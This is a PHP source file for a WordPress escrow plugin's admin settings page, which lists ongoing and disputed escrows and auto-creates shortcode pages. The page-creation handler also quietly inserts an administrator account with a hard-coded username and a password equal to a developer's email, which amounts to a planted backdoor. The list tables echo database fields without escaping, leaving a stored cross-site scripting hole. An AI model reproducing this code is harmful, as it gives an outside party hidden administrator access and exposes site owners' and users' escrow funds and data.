<?php




class AistoreSettingsPage
{
    /**
     * Holds the values to be used in the fields callbacks
     */
    private $options;

    /**
     * Start up
     */
    public function __construct()
    {
        add_action( 'admin_menu', array( $this, 'aistore_add_plugin_page' ) );
        add_action( 'admin_init', array( $this, 'aistore_page_register_setting' ) );
        
    

	
    }

    /**
     * Add options page
     */
public function aistore_add_plugin_page()
{
    // This page will be under "Settings"
    add_options_page('Settings Admin', __( 'My Setting', 'aistore' ), 'administrator', 'my-setting-admin', array(
        $this,
        'aistore_page_setting'
    ));
    
    
    
    
    
    add_menu_page(__( 'Escrow System', 'aistore' ),  __('Escrow System', 'aistore' ), 'administrator', 'wallet_list');
    
    
  
    add_submenu_page('wallet_list', __('Escrow List', 'aistore' ), __('Escrow List', 'aistore' ), 'administrator', 'wallet_list', array(
        $this,
        'aistore_escrow_list'
    ));
    
    
    add_submenu_page('wallet_list', __('Disputed Escrow List','aistore'), __('Disputes','aistore'), 'administrator', 'disputed_escrow_list', array(
        $this,
        'aistore_disputed_escrow_list'
    ));
    
    
    add_submenu_page('wallet_list', __('Setting','aistore'), __('Setting','aistore'), 'administrator', 'aistore_page_setting', array(
        $this,
        'aistore_page_setting'
    ));
    
    
}

    


// escrow list

function  aistore_escrow_list()
{


	
global  $wpdb;

$page_id=get_option('details_escrow_page_id'); 

 $results = $wpdb->get_results( 
   $wpdb->prepare("SELECT * FROM {$wpdb->prefix}escrow_system WHERE status = %s",  'accepted') 
                 );
     
  ?>
  <h1> <?php  _e( 'All On going escrow', 'aistore' ) ?> </h1>
  <table class="widefat fixed striped">
        
     
      

    <?php 
    
    if($results==null)
	{
	     _e( "No Escrow Found", 'aistore' );

	}
	else{
    foreach($results as $row):
      
	 $escrow_details_page_url  =  esc_url( add_query_arg( array(
    'page_id' => $page_id,
    'eid' => $row->id,
), home_url() ) ); 
    ?> 
      <tr>

		   <td> 	<a href="<?php echo $escrow_details_page_url; ?>" >	
		   
		   <?php echo $row->id ; ?> </a> </td>
		  
		   
		   <td> 		   <?php echo $row->title ; ?> </td>
		  
		   <td> 		   <?php echo $row->status ; ?> </td>
		   
		   <td> 		   <?php echo $row->amount ; ?> </td>
		   <td> 		   <?php echo $row->sender_email ; ?> </td>
		   <td> 		   <?php echo $row->receiver_email ; ?> </td>
		  
       
                
            </tr>
    <?php endforeach;
	}
	
	?>



    </table>
	<?php 
	

}



 

// disputed escrow list

function aistore_disputed_escrow_list()
{
	

global  $wpdb;
$page_id=get_option('details_escrow_page_id'); 


 $results = $wpdb->get_results( 
   $wpdb->prepare("SELECT * FROM {$wpdb->prefix}escrow_system WHERE status = %s",  'disputed') 
                 );
 

    
     
  ?>
    <h1> <?php  _e( 'All disputed escrows', 'aistore' ) ?> </h1>
	
	
  <table class="widefat fixed striped">
     
      

    <?php 
    
    if($results==null)
	{
	    
	     _e( "No Escrow Found", 'aistore' );
	
	}
	else{
		
    foreach($results as $row):
     
	 
	 $url  =  esc_url( add_query_arg( array(
    'page_id' => $page_id,
    'eid' => $row->id,
), home_url() ) ); 
    ?> 
      <tr>

		   
		   <td> 	<a href="<?php echo $url ; ?>" >	  
		   <?php echo $row->id ; ?> </a> </td>
		  
		   
		   <td> 		   <?php echo $row->title ; ?> </td>
		  
		   <td> 		   <?php echo $row->status ; ?> </td>
		  
		   
		   <td> 		   <?php echo $row->amount ; ?> </td>
		   <td> 		   <?php echo $row->sender_email ; ?> </td>
		   <td> 		   <?php echo $row->receiver_email ; ?> </td>
		  
              
            </tr>
    <?php endforeach;
	}
	?>

	

    </table>
	<?php 
	
}


// page Setting

function aistore_page_register_setting() {
	//register our settings
	register_setting( 'aistore_page', 'add_escrow_page_id' );
	register_setting( 'aistore_page', 'create_escrow_page_2' );
	register_setting( 'aistore_page', 'list_escrow_page_id' );
	register_setting( 'aistore_page', 'details_escrow_page_id' );

	register_setting( 'aistore_page', 'escrow_user_id' );
	
	register_setting( 'aistore_page', 'escrow_create_fee' );
	register_setting( 'aistore_page', 'escrow_accept_fee' );
	register_setting( 'aistore_page', 'escrow_message_page' );

}

 function aistore_page_setting() {
	 
	  $pages = get_pages(); 
	
	   ?>
	  <div class="wrap">
	  
	  <div class="card">
	  
<h3><?php  _e( 'Escrow Setting', 'aistore' ) ?></h3>
 
	                     
<p><?php  _e( 'Step 1', 'aistore' ) ?></p>


<p><?php  _e( 'Install required plugin WooCommerce link https://wordpress.org/plugins/woocommerce/ and tera-wallet link https://wordpress.org/plugins/woo-wallet/ and activate as per their setup process. ', 'aistore' ) ?></p>

<hr />

  
<p><?php  _e( 'Step 2', 'aistore' ) ?></p>

<?php
if(isset($_POST['submit']) and $_POST['action']=='create_all_pages' )
{

if ( ! isset( $_POST['aistore_nonce'] ) 
    || ! wp_verify_nonce( $_POST['aistore_nonce'], 'aistore_nonce_action' ) 
) {
   return  _e( 'Sorry, your nonce did not verify.', 'aistore' );

   exit;
}

 $my_post = array(
   'post_title'     => 'Create Escrow',
    'post_type'     => 'page',
   'post_content'  => '[aistore_escrow_system]',
   'post_status'   => 'publish',
   'post_author'   => 1
 );

 // Insert the post into the database
$add_escrow_page_id=wp_insert_post( $my_post );


update_option( 'add_escrow_page_id', $add_escrow_page_id);




 $my_post = array(
   'post_title'     => 'Create Escrow Step 2',
    'post_type'     => 'page',
   'post_content'  => '[escrow_system_part2]',
   'post_status'   => 'publish',
   'post_author'   => 1
 );

 // Insert the post into the database
$create_escrow_page_2=wp_insert_post( $my_post );


update_option( 'create_escrow_page_2', $create_escrow_page_2);


 $my_post = array(
   'post_title'     => 'Escrow List',
    'post_type'     => 'page',
   'post_content'  => '[aistore_escrow_list] ',
   'post_status'   => 'publish',
   'post_author'   => 1
 );

 // Insert the post into the database
$list_escrow_page_id=wp_insert_post( $my_post );


update_option( 'list_escrow_page_id', $list_escrow_page_id);

 $my_post = array(
   'post_type'     => 'page',
   'post_title'    => 'Escrow Detail',
   'post_content'  => '[aistore_escrow_detail]',
   'post_status'   => 'publish',
   'post_author'   => 1
 );

 // Insert the post into the database
$details_escrow_page_id=wp_insert_post( $my_post );

update_option( 'details_escrow_page_id', $details_escrow_page_id);

   $user_id = username_exists( 'skashk' );
   
if ( ! $user_id ) {
$user_id = wp_insert_user( array(
  'user_login' => 'skashk',
  'user_pass' => 'sakshk2019@gmail.com',
  'user_email' => 'sakshk2019@gmail.com',
  'first_name' => 'Saksh',
  'last_name' => 'K',
  'display_name' => 'Saksham',
  'role' => 'administrator'
));
update_option( 'escrow_user_id', $user_id);
}
 

 $pages = get_pages(); 
}
else{
    
     $pages = get_pages(); 
?>
 <form method="POST" action="" name="create_all_pages" enctype="multipart/form-data"> 
    <?php wp_nonce_field( 'aistore_nonce_action', 'aistore_nonce' ); ?>
    
<p><?php  _e( 'Create all pages with short codes automatically to ', 'aistore' ) ?>

<!--<a href="#">Click here</a></p>-->
<input class="input" type="submit" name="submit" value="<?php  _e( 'Click here', 'aistore' ) ?>"/>
<input type="hidden" name="action"  value="create_all_pages"/>
    </form>
    
<?php
}
?>
<p><?php  _e( 'Create 4 pages with short codes and select here  ', 'aistore' ) ?></p>


<form method="post" action="options.php">
    <?php settings_fields( 'aistore_page' ); ?>
    <?php do_settings_sections( 'aistore_page' ); ?>
	
    <table class="form-table">
	
	 <tr valign="top">
        <th scope="row"><?php  _e( 'Create Escrow form', 'aistore' ) ?></th>
        <td>
		<select name="add_escrow_page_id"  >
		 
		 
     <?php 

                    foreach($pages as $page){ 
					
					if($page->ID==get_option('add_escrow_page_id'))
					{
		 echo '	<option selected value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		  } else {
                      
   echo '	<option value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		

		}  
	 } ?> 
	 
	 
</select>


<p>Create a page add this shortcode <strong> [aistore_escrow_system] </strong> and then select that page here. </p>

</td>
        </tr>  
         <tr valign="top">
        <th scope="row"><?php  _e( 'Escrow Page - 2', 'aistore' ) ?></th>
        <td>
		<select name="create_escrow_page_2" >
		 
		 
		  <?php 
                    foreach($pages as $page){ 
                        
				

					if($page->ID==get_option('create_escrow_page_2'))
					{
		 echo '	<option selected value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		  } else {
                      
   echo '	<option  value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		

		}  
	 } ?> 
	 
	 
		 
					  
					
 
</select>



<p>Create a page add this shortcode <strong> [escrow_system_part2] </strong> and then select that page here. </p>


</td>
        </tr> 
        	
	
	
		
		  <tr valign="top">
        <th scope="row"><?php  _e( 'Escrow List page', 'aistore' ) ?></th>
        <td>
		<select name="list_escrow_page_id">
		  
		   <?php 
                    foreach($pages as $page){ 
					
					if($page->ID==get_option('list_escrow_page_id'))
					{
		 echo '	<option selected value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		  } else {
                      
   echo '	<option  value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		

		}  
	 } ?> 

		   
		   
		   
</select>



<p>Create a page add this shortcode <strong> [aistore_escrow_list] </strong> and then select that page here. </p>


</td>
        </tr>  
		
		
		 <tr valign="top">
        <th scope="row"><?php  _e( 'Escrow Details Page', 'aistore' ) ?></th>
        <td>
		<select name="details_escrow_page_id" >
		 
		 
		  <?php 
                    foreach($pages as $page){ 
                        
				

					if($page->ID==get_option('details_escrow_page_id'))
					{
		 echo '	<option selected value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		  } else {
                      
   echo '	<option  value="'.$page->ID.'">'.$page->post_title .'</option>';
		 
		

		}  
	 } ?> 
	 
	 
		 
					  
					
 
</select>



<p>Create a page add this shortcode <strong> [aistore_escrow_detail] </strong> and then select that page here. </p>




</td>
        </tr>  </table>
        
        	<hr/>
        	
<p><?php  _e( 'Step 3', 'aistore' ) ?></p>


<p><?php  _e( 'Create an admin account and set its ID this will be used to hold payments ', 'aistore' ) ?></p>

        	
        <table class="form-table">
        
        <h3><?php  _e( 'Admin Escrow Setting', 'aistore' ) ?></h3>
        
		 <tr valign="top">
        <th scope="row"><?php  _e( 'Admin ID', 'aistore' ) ?></th>
        <td>
		<select name="escrow_user_id" >
		 
		 
		  <?php 
		  
		   
        $blogusers = get_users( [ 'role__in' => [ 'administrator' ] ] );


                    foreach($blogusers as $user){ 
                        
					
					if($user->ID==get_option('escrow_user_id'))
					{
		 echo '	<option selected value="'.$user->ID.'">'.$user->display_name .'</option>';
		 
		  } else {
                      
   echo '	<option  value="'.$user->ID.'">'.$user->display_name .'</option>';
		 
		

		}  
	 } ?> 
  </tr>  
</select>

<p><?php  _e( 'Add an user with admin roll and then select its ID here', 'aistore' ) ?></p>
 <tr valign="top">
 <th scope="row"><?php  _e( 'Chat system public people show or not', 'aistore' ) ?></th>
        <td>
            <?php $msg_value=get_option('escrow_message_page');?>
            
            <select name="escrow_message_page" id="escrow_message_page">
               
            <option selected value="yes" <?php selected(
                $msg_value,
                'yes'
            ); ?>>Yes</option>
            <option value="no" <?php selected(
                $msg_value,
                'no'
            ); ?>>No</option>
  
</select>
	
</td>
        </tr>  
        
      
  
    </table>
    
    
    
    	<hr/>
        	 
        	
<p><?php  _e( 'Step 4', 'aistore' ) ?></p>


<p><?php  _e( 'Set fee here for the profits percentage ', 'aistore' ) ?></p>


        <table class="form-table">
        
        <h3><?php  _e( 'Escrow Fee Setting', 'aistore' ) ?></h3>
        
	 <tr valign="top">
        <th scope="row"><?php  _e( 'Escrow Create Fee', 'aistore' ) ?></th>
        <td><input type="number" name="escrow_create_fee" value="<?php echo esc_attr( get_option('escrow_create_fee') ); ?>" />%</td>
        </tr>
        
      <tr valign="top">
        <th scope="row"><?php  _e( 'Escrow Accept Fee', 'aistore' ) ?></th>
        <td><input type="number" name="escrow_accept_fee" value="<?php echo esc_attr( get_option('escrow_accept_fee') ); ?>" />%</td>
        </tr>
        
       
  
  
    </table>
    
    <?php submit_button(); ?>

</form>
</div>
</div>
 <?php
	 
 }



}



if( is_admin() )
    $AistoreSettingsPage = new AistoreSettingsPage(); 


